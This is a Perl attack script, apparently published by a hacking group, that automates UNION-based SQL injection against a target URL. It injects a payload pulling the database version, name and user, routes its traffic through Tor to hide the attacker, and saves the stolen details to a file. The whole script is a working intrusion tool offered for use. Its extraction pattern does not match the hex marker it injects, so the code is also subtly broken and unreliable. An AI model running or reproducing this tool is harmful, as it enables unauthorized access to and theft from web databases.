#!/usr/bin/perl
# Thx to: CrashBandicot, telah membantu pembuatan tools ini XD
# 4WSec
# Anon Cyber Team

use LWP::UserAgent;
use HTTP::Request;
use LWP::Protocol::socks;
use Getopt::Long;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();

    print q {       
 _____     _          _____ _____ __    _ 
|  _  |_ _| |_ ___   |   __|     |  |  |_|
|     | | |  _| . |  |__   |  |  |  |__| |
|__|__|___|_| |___|  |_____|__  _|_____|_|
                              |__|        
              Author: 4WSec
           $ Anon Cyber Team $
      Automated SQL injection Exploit
      
      
    };

GetOptions(
    'url|u=s' => \$url,
) || &Help();

     my $site = $url;
     my $ev = "--";

     my $DB = "concat(0x496e6a656374206279203457536563,version(),0x496e6a656374206279203457536563,database(),0x496e6a656374206279203457536563,user(),0x496e6a656374206279203457536563)";
	 if ($site =~ /(.*)1337(.*)/i)
     {
     	print "\n[x] Info Getting, Scan Started At ".$hour.":".$min.":".$sec."....\n\n";
         my $newlink = $1.$DB.$2.$ev;
         my $ua = LWP::UserAgent->new( ssl_opts => { verify_hostname => 0 }, agent => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
		 $ua->proxy([qw/ http https /] => 'socks://127.0.0.1:9150'); #TOR
	     my $request = $ua->get($newlink);
	     my $content = $request->content;
         if ($content =~ /4WSecHaXor666(.*)4WSecHaXor666(.*)4WSecHaXor666(.*)4WSecHaXor666/)
         {					  

                 cr0t("[0] Database Version  : $1\n");
                 cr0t("[0] Database Name     : $2\n");
                 cr0t("[0] DB UserName       : $3\n\n");

                 print "\n[+] Result Saved to result_sql.txt\n";
			 } else { 
		 
		 die("[-] FAIL\n"); }
	  }
	 else { die("[X] Silahkan masukkan target seperti ini:\nhttp://target..co.li/index.php?id=0+union+select+1,2,1337,3\n");	 }


	sub cr0t {
    my $value = $_[0];
    open(LOG,">>result_sql.txt") or die(" [x] Tidak dapat membuat atau membuka file log.\n");
    print LOG "$value";
    close(LOG);
    print $value;
}

sub Help {
    print "\n[#] Auto SQLi \n";
    print "[#] Coder : 4WSec\n";
    print "[x] Usage :\n";
    print "[0] $0 -u | <site>.\n";
    print "\nExample: $0 -u http://target.co.li/index.php?id=0+union+select+1,2,1337,3\n\n";
   
}
